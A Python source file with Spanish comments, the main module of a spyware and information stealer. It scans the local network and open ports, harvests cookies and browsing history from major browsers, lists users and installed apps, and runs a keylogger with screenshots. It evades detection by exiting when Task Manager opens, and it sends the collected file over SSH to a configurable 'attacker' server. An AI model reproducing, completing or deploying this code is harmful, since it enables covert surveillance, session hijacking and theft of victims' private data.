import re
from http.server import HTTPServer, SimpleHTTPRequestHandler
import browser_cookie3
from browser_history.browsers import *
from browsers import getBrowsersInfo
import threading
import sys
import json
import sens
import net
import operativeSystem
import datetime
import os
carpeta_script = os.path.dirname(os.path.abspath(__file__)) #Obtenemos la ruta de mi script
with open(carpeta_script+'\\settings.json', 'r') as archivo:
    settings = json.load(archivo)
    
    #Obtenemos la configuración de nuestro archivo settings.json
PORT = settings["server Port"]
DELAY = settings["port Scanning Delay"]
HOST_DISCOVER = settings["perform Host Discovery"]
PORTS_CANN = settings["perform Port Scanning"]
APP_DISCOVERY = settings["perform App Discovery"]
USER_DISCOVERY = settings["perform User Discovery"]
COLLECT_BROWSERS_INFO = settings["Collect Browsers Info"]
RAISE_WEB_SERVER = settings["Raise Web Server"]
USE_KEYLOGGER = settings["Use KeyLogger"]
SEND_DATA= settings["send Data Via SSH"]
ATTACKER_IP=settings["attacker SSH Server IP"]
ATTACKER_USERNAME= settings["attacker SSH Server Username"]
ATTACKER_PASSWD=settings["attacker SSH Server Password"]
ATTACKER_FOLDER=settings["attacker SSH Server Folder"]
TAKE_SCREEN_SHOTS = settings['Take Screen Shoots']

def autoAbort():    #Creamos una función que aborte el programa si ve que no quedan hilos en ejecución o se abre el task manager
    loops = 0
    while sens.is_task_manager_open()==False and len(threading.enumerate()) >1:
        if loops==8000 and TAKE_SCREEN_SHOTS: #Aprobechamos este loop para tomar screenshoots cada 8000 ciclos
            sens.takeScreenShot(imageName=datetime.datetime.now().strftime("%Y%m%d_%H%M%S"), path= f"{carpeta_script}\\output\\pictures")
            loops = 0 #Reiniciamos la variable para que no se desborde
        loops+=1
    sys.exit()
    
def main():

    publicIP= net.getPublicIP() #Obtemos la ip local y pública
    localIP = net.getLocalIP()
    if not os.path.exists(f'{carpeta_script}\\output'):
        os.mkdir(f'{carpeta_script}\\output')
    #Creamos un archivo json usando nuestra ip local y pública como nombre. Usaremos este archivo para anotar toda la información
    with open(f'{carpeta_script}\\output\\{publicIP.replace(".", "-")}_{localIP.replace(".", "-")}.json', 'w') as archivo:
        
        # ------------------------------------
        # ----------   NETWORK  --------------
        # ------------------------------------
        
        archivo.write('{\n\t"Network":{')
        archivo.write("\n\t\t"+f"\"Public IP\": \"{publicIP}\",\n\t\t\"Local IP\": \"{localIP}\",\n\n\t\t\"Interfaces\":{{\n\t\t\t")
        index = False
                #Obtenemos todas las interfaces de red
        for interface, value in net.getInterfacesInfo().items():
            if index== False:  
                archivo.write(f'"{interface}":{{\n\t\t\t\t"Network Data": {{ "gateway":"{value[0]}", "submask": "{value[1]}" }}')
                index = True
            else:
                archivo.write(f',\n\t\t\t"{interface}":{{\n\t\t\t\t"Network Data": {{ "gateway":"{value[0]}", "submask": "{value[1]}" }}')
            if HOST_DISCOVER:
                try:
                    #Escaneamos todas las redes de cada interfaz
                    hostDiscovery =net.hostDiscovery(f"{".".join(value[0].split(".")[:-1])+"."+str(int(value[0].split(".")[3])-1)  +"/"+  str(sum(bin(int(x)).count('1') for x in value[1].split('.'))) }").items()

                except:
                    hostDiscovery = {"":""}
                archivo.write(',\n\t\t\t\t"Hosts in Network": {  ')
                index2 = False
                try:
                    for ip, MacAddres in hostDiscovery:
                        if index2 == False:  #Ponemos la ip y Mac de todos los hosts en la red
                            archivo.write(f'\n\t\t\t\t\t"{ip}":\t{{"Mac Addres": "{MacAddres}"')
                            index2 = True
                        else:
                            archivo.write(f',\n\t\t\t\t\t"{ip}":\t{{"Mac Addres": "{MacAddres}"')
                        index3 = False
                        if PORTS_CANN:
                            archivo.write(',\n\t\t\t\t\t\t"ports": {  ')
                            for port, service in net.portScanner(ip, DELAY): #La IP y el DELAY entre puerto y puerto
                                if index3 == False: #Ponemos los puertos y servicios que utiliza cada host
                                    archivo.write(f'\n\t\t\t\t\t\t\t"{port}": "{service}"')
                                    index3 = True
                                else:
                                    archivo.write(f',\n\t\t\t\t\t\t\t"{port}": "{service}"')
                            archivo.write('\n\t\t\t\t\t\t}')

                        archivo.write("\n\t\t\t\t\t}")
                    
                except:
                    pass
                finally:
                    archivo.write("\n\t\t\t\t}")
            archivo.write('\n\t\t\t}')
            
        archivo.write('\n\t\t}\n\t}')
            
            
            
        # ------------------------------------
        # ----------   BROWSER  --------------
        # ------------------------------------
        if COLLECT_BROWSERS_INFO:
            browsers = {}
            #Obtenemos las cookies y el historial de todos los navegadores en el mercado
            for browserCookie, browserHistory in {browser_cookie3.chrome: Chrome, browser_cookie3.brave: Brave,  
                                                browser_cookie3.chromium:Chromium, browser_cookie3.edge:Edge, 
                                                browser_cookie3.firefox: Firefox, browser_cookie3.librewolf: LibreWolf, 
                                                browser_cookie3.opera: Opera, browser_cookie3.opera_gx:OperaGX, 
                                                browser_cookie3.safari:Safari, browser_cookie3.vivaldi:Vivaldi}.items():

                browsers[browserHistory.name]=getBrowsersInfo(browserCookie, browserHistory)

            archivo.write(',\n\t\"Browsers\":{\n\t\t')

            for browser in browsers:
                if browser == "Chrome":
                    if browsers[browser][0] == None:
                        browsers[browser][0] = "None"
                        #Ponemos las cookies formateadas en json
                    archivo.write(f'"{browser}\": {{\n\t\t\t"Cookies\":{browsers[browser][0]},\n\t\t\t"History":{{\n')
                else:
                    if browsers[browser][0] == None:
                        browsers[browser][0] = '"None"'

                    archivo.write('},\n\t\t"'+browser+f'": {{\n\t\t\t"Cookies":{browsers[browser][0]},\n\t\t\t"History":{{\n' )
                if not browsers[browser][1] is None:
                    index = 0
                    
                    for history in browsers[browser][1]:
                        if index == 0: #Creamos una entrada para cada página visitada y su fecha
                            archivo.write( f'\t\t\t\t"entry{index}":{{"{history["datetime"]}": "{history["url"]}"}}' )

                        else:
                            archivo.write( f',\n\t\t\t\t"entry{index}":{{"{history["datetime"]}": "{history["url"]}"}}' )
                        index+=1
                archivo.write("\n\t\t\t}\n\t\t")
            archivo.write("}\n\t}")
        
        # ------------------------------------
        # ----------   SYSTEM  ---------------
        # ------------------------------------
        archivo.write(',\n\t"System":{')
        if USER_DISCOVERY:
            archivo.write('\n\t\t"Users": [')
            index = True
            for user in operativeSystem.getUsers():
                if index:
                    archivo.write(f'\n\t\t\t"{user}"')
                    index = False
                else:
                    archivo.write(f',\n\t\t\t"{user}"')
            archivo.write('\n\t\t]')
            if APP_DISCOVERY: archivo.write(',')
        if APP_DISCOVERY:
            archivo.write('\n\t\t"Apps In Device": {')
            index = 0
            for app in operativeSystem.getApps():
                if index==0:  # ponemos todas las aplicaciones instaladas y la versión de cada una de estas   "aplicación":"versión"
                    archivo.write(f'\n\t\t\t"Entry{index}":{{"{app[0]}":"{app[1]}"}}')
                    
                else:
                    archivo.write(f',\n\t\t\t"Entry{index}":{{"{app[0]}":"{app[1]}"}}')
                index+=1
            archivo.write('\n\t\t}')
            
        archivo.write('\n\t}\n}')
                
    print("Escaneo terminado. Pasando a segundo plano...")
    if SEND_DATA: #Enviamos el archivo creado a nuestro servidor SSH
        net.transfer_file(f'{publicIP.replace(".", "-")}_{localIP.replace(".", "-")}.json', ATTACKER_FOLDER, ATTACKER_IP, ATTACKER_USERNAME, ATTACKER_PASSWD)

    if RAISE_WEB_SERVER:
        httpd = HTTPServer((f"{localIP}", int(PORT)), SimpleHTTPRequestHandler)
        print("\nServing HTTP on localhost port " + str(PORT) + f" (http://{localIP}:{PORT}/) ...")
        httpd.serve_forever()  #Levantamos un servidor en python para poder descargar los archivos resultantes


        
if __name__ == "__main__":
    mainThread = threading.Thread(target=main)
    mainThread.daemon = True
    mainThread.start()

    if USE_KEYLOGGER:
        fileName= f"{carpeta_script}\\output\\{net.getPublicIP()}".replace(".", "-")+"_"+f"{net.getLocalIP()}".replace(".", "-") #Creamos un nombre para el archivo de keylogger con la ip pública y la ip local
        keyLogger = threading.Thread(target=sens.listen, args=(fileName,)) #Preparamos el proceso con la función listen para que se ejecute en paralelo
        keyLogger.daemon = True     # Hacemos que el hilo keylogger termine si el hilo principal (el que estará en un bucle vigilando que el task manager no se abre) muere
        keyLogger.start()           #Iniciamos el key logger
    autoAbort()

